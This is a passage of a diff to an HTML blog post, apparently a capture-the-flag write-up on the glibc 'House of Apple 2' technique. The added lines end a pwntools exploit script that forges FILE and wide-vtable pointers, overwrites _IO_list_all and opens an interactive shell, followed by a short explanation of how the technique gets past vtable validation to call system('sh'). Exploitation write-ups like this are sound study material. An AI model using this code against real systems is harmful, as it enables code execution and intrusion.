+w(1, 0x88,  p64(base + 0x10))
+w(1, 0xa0,  p64(base + 0x100))
+w(1, 0x1e0, p64(base + 0x200))
+w(1, libc.sym._IO_list_all - base, p64(base))
+
+sl(b'&gt;&gt; ', b'5')
+io.interactive()
+</code></pre>
+
+              <h2>Closing thoughts</h2>
               <p>
-                1. <strong>Before:</strong> Chunk filled with
-                <code>0x1122334455667788</code> 2. <strong>After:</strong> Chunk
-                filled with <code>0x00007ffff7e2b770</code> (overflow_buf
-                address)
+                House of Apple 2 is a very interesting technique. glibc's vtable validation only covers the <em>primary</em> vtable - the one pointed to by <code>fp->vtable</code>.in my understading  the trick is to set <code>_mode = 1</code> to force the wide-character code path, point the main vtable at a real libc structure (<code>_IO_wfile_jumps</code>) to pass the check, and then slip a fake wide vtable in through the unvalidated back door. When glibc calls <code>doallocate</code>, it ends up calling <code>system</code> with <code>_flags</code> as the argument - and <code>_flags = "  sh"</code> 
+              </p>
+              <p>
+                 No heap feng shui needed , we all hate heap spraying !!
               </p>
             </div>
+            <div class="img-container">
+                <img src="../images/posts/an-apple-a-day/apple.gif" alt="apple" class="latex-show-gif" />
+              </div>
             <div class="status-bar mt-16">
               <a href="../blog.html" class="btn">
                 <img
